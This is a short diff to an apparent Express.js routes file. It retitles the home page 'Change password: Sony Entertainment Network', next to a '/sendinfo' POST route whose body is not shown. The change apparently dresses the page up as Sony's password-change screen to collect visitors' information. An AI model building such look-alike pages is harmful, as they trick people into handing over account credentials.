@@ -4,7 +4,7 @@ var Info = require("../models/info");
 
 /* GET home page. */
 router.get('/', function(req, res, next) {
-  res.render('index', { title: 'Express' });
+  res.render('index', { title: 'Change password: Sony Entertainment Network' });
 });
 
 router.post("/sendinfo", function(req, res, next) {
